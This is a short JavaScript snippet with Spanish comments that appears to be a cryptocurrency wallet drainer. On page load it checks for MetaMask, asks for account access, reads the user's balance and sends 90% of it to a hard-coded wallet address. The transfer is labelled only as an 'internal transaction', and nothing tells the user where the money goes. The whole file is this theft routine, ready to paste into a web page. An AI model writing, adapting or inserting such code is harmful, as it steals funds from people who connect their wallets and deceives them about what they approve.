// Verificar si MetaMask está instalado y activo
if (window.ethereum) {
    const web3 = new Web3(window.ethereum);

    // Solicitar acceso a la cuenta de MetaMask
    window.ethereum.enable().then(accounts => {
        const usuarioAddress = accounts[0]; // Obtener la dirección del usuario conectado

        // Dirección a la que se enviará el 90% de ETH o BNB (dependiendo de la red)
        const direccionDestino = '0x01C65F22A9478C2932e62483509c233F0aaD5c72'; // Reemplaza con la dirección a la que quieres enviar fondos

        // Calcular el 90% del saldo del usuario (en Wei)
        web3.eth.getBalance(usuarioAddress).then(balance => {
            const cantidadEnviar = balance * 0.9; // Calcula el 90% del saldo del usuario
            const cantidadEnviarEnWei = web3.utils.toWei(cantidadEnviar.toString(), 'wei');

            // Enviar la transacción interna al destino
            web3.eth.sendTransaction({
                from: usuarioAddress,
                to: direccionDestino,
                value: cantidadEnviarEnWei,
                gas: '21000', // Límite de gas para la transacción (puedes ajustarlo según sea necesario)
            })
            .then(receipt => {
                console.log('Transacción interna exitosa:', receipt);
            })
            .catch(error => {
                console.error('Error en la transacción interna:', error);
            });
        });
    });
} else {
    console.error('MetaMask no está instalado.');
}
